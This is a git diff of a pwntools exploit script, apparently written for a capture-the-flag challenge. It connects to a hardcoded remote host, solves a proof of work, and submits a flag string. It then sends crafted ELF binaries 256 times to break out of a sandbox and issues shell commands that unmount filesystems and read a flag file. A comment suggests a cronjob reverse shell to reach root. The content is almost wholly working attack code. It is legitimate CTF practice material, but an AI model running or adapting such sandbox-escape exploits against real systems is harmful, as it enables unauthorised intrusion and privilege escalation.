@@ -1,4 +1,5 @@
 from pwn import *
+from subprocess import check_output
 
 context.arch = 'amd64'
 
@@ -6,7 +7,23 @@ os.system('make')
 idle_elf = open('./idle', 'rb').read()
 init_shell = open('./shell', 'rb').read()
 
-p = remote('10.69.0.1', 20000)
+def connect_remote():
+    p = remote('20.83.201.101', 20000)
+    p.recvuntil(b'./kctf-pow solve ')
+
+    pow = str(p.recvline().strip(), 'utf8')
+    result = check_output(['kctf-pow', 'solve', pow])
+    p.sendline(result.strip())
+
+    p.recvuntil(b'Flag from part 1: ')
+    #p.sendline(open('../flag1.txt', 'rb').read().strip())
+    p.sendline(b"ADMIN_ADMIN!!!!_6G93ugsoi;jsjfaie")
+    return p
+
+#p = remote('10.69.0.1', 20000)
+p = remote('20.83.201.101', 58031)
+#p = connect_remote()
+#p.interactive()
 
 def sandbox(elf):
     p.sendlineafter(b'>', b'1')
@@ -21,6 +38,7 @@ def clone(num, elf):
         p.sendafter(b'data?', elf)
 
 for i in range(256):
+    print(f"Sending {i}/256")
     if i == 0:
         sandbox(init_shell)
     else:
@@ -28,7 +46,7 @@ for i in range(256):
 
 clone(0, None)
 p.recvuntil(b' ')
-#context.log_level = 'debug'
+context.log_level = 'debug'
 pause()
 p.sendline(b'/bin/busybox umount /')
 p.sendline(b'exec 2>&1')
@@ -38,7 +56,8 @@ p.sendline(b'exec 2>&1')
 # For ./run.sh inside socat the fd becomes 6
 p.sendline(b'/tmp/working/bin/start_fserv 4')
 p.sendline(b'umount /proc')
-
+p.sendline(b'echo HHI:')
+p.recvuntil(b'HHI:')
 p.sendline(b'echo "HI: " && (ps | grep /tmp/fserv)')
 p.recvuntil(b'HI: ')
 p.recvline()
@@ -66,5 +85,6 @@ p.sendline(b'cat /flag1.txt')
 # cronjob that sets up a reverse shell and then run `debian config --default-user root`
 # which would also get the job done.
 
-p.interactive()
+while True:
+    p.interactive()
 
